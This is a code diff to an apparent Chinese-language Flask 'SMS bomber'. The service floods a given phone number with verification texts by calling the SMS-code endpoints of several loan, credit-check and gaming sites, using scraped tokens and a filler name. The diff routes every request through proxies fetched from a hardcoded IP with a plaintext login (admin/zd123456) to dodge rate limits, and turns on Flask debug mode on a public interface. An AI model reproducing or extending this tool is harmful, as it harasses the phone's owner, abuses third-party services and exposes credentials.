@@ -4,6 +4,7 @@ import json
 import requests
 import time
 import re
+import datetime
 from lxml import etree
 
 app = Flask(__name__)
@@ -27,21 +28,25 @@ def check():
     # 对参数进行操作
     return_dict['result'] = start(phone, times)
 
-    return json.dumps(return_dict, ensure_ascii=False)
 
+def getProxy():
+    s = requests.session()
+    s.keep_alive = False
 
-# 功能函数
-def tt(name, age):
-    result_str = "%s今年%s岁" % (name, age)
-    return result_str
+    url = 'http://120.27.216.150:5000'
+    headers = {
+        'Connection': 'close',
+    }
+    proxy = s.get(url=url, headers=headers, auth=('admin', 'zd123456')).text[0:-6]
+    return proxy
 
 
 # %% 正规贷款
 
-def zgdk(phone):
+def zgdk(phone, proxy):
     global count
     data = {'mobile': phone}
-    response = requests.post(url='https://mgjr.360yhzd.com/api/sms/getCode', data=data)
+    response = requests.post(url='https://mgjr.360yhzd.com/api/sms/getCode', data=data, proxies=proxy)
     text = response.text
     if '提交成功' in text:
         print('正规贷款信息发送成功!')
@@ -52,11 +57,11 @@ def zgdk(phone):
 
 # %% 融多多贷款
 
-def rdd(phone):
+def rdd(phone, proxy):
     global count
     session = requests.session()
     url = 'https://91rongduoduo.com/m/bdss04'
-    text = session.get(url).text
+    text = session.get(url, proxies=proxy).text
     html = etree.HTML(text)
     usertoken = html.xpath('//input[@id="usertoken"]/@value')[0]
     data = {
@@ -64,7 +69,7 @@ def rdd(phone):
         'name': '张伟伟',
         'usertoken': usertoken
     }
-    response = session.post(url='https://91rongduoduo.com/m/center_code', data=data)
+    response = session.post(url='https://91rongduoduo.com/m/center_code', data=data, proxies=proxy)
     text = response.text
     if '发送成功' in text:
         print('融多多贷款信息发送成功!')
@@ -75,11 +80,11 @@ def rdd(phone):
 
 # %% 穆帅贷款
 
-def ms(phone):
+def ms(phone, proxy):
     global count
     session = requests.session()
     url = 'http://msswxx.com/m/mss01'
-    text = session.get(url).text
+    text = session.get(url, proxies=proxy).text
     html = etree.HTML(text)
     usertoken = html.xpath('//input[@id="usertoken"]/@value')[0]
     data = {
@@ -87,7 +92,7 @@ def ms(phone):
         'name': '张伟伟',
         'usertoken': usertoken
     }
-    response = session.post(url='http://msswxx.com/m/center_code', data=data)
+    response = session.post(url='http://msswxx.com/m/center_code', data=data, proxies=proxy)
     text = response.text
     if '发送成功' in text:
         print('穆帅贷款信息发送成功!')
@@ -98,10 +103,10 @@ def ms(phone):
 
 # %% 郎宇信息
 
-def lyxx(phone):
+def lyxx(phone, proxy):
     global count
     data = {'mobile': phone}
-    response = requests.post(url='http://www.lyxxjs.com/msm/code/sendSms.do', data=data)
+    response = requests.post(url='http://www.lyxxjs.com/msm/code/sendSms.do', data=data, proxies=proxy)
     text = response.text
     if '发送成功' in text:
         print('郎宇信息信息发送成功!')
@@ -112,11 +117,11 @@ def lyxx(phone):
 
 # %% 店透视
 
-def dtx(phone):
+def dtx(phone, proxy):
     global count
     headers = {'Referer': 'https://www.diantoushi.com/useradmin.html?type=searchBlack'}
     url = f'https://www.diantoushi.com/user/v2/captcha?mobile={phone}'
-    response = requests.get(url=url, headers=headers)
+    response = requests.get(url=url, headers=headers, proxies=proxy)
     if '"status":0,"message":"ok"' in response.text:
         print('店透视信息发送成功!')
         count = count + 1
@@ -126,7 +131,7 @@ def dtx(phone):
 
 # %% 查征信
 
-def czx(phone):
+def czx(phone, proxy):
     global count
     headers = {
         'accept': '*/*',
@@ -135,7 +140,7 @@ def czx(phone):
         'x-requested-with': 'XMLHttpRequest',
     }
     url = 'https://www.sczhengxin.com/api/home/SmsPush'
-    response = requests.post(url=url, data=json.dumps({"PhoneNumber": phone}), headers=headers)
+    response = requests.post(url=url, data=json.dumps({"PhoneNumber": phone}), headers=headers, proxies=proxy)
     # print(response.text)
     if '"statusCode":0,"code":1' in response.text:
         print('查征信信息发送成功!')
@@ -145,11 +150,11 @@ def czx(phone):
 
 
 # %%  4399
-def ssjj(phone):
+def ssjj(phone, proxy):
     global count
     url = 'http://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone={}&appId=www_home&v=1&sig=&t={}&v=1'.format(
         phone, int(time.time() * 1000))
-    response = requests.get(url)
+    response = requests.get(url, proxies=proxy)
     if '4' in response.text:
         print('4399信息发送成功!')
         count = count + 1
@@ -182,7 +187,6 @@ def start(phone, times):
 
 
 if __name__ == "__main__":
-    # app.run(debug=True)
     server = make_server('0.0.0.0', 5000, app)
     server.serve_forever()
-    app.run()
+    app.run(debug=True)
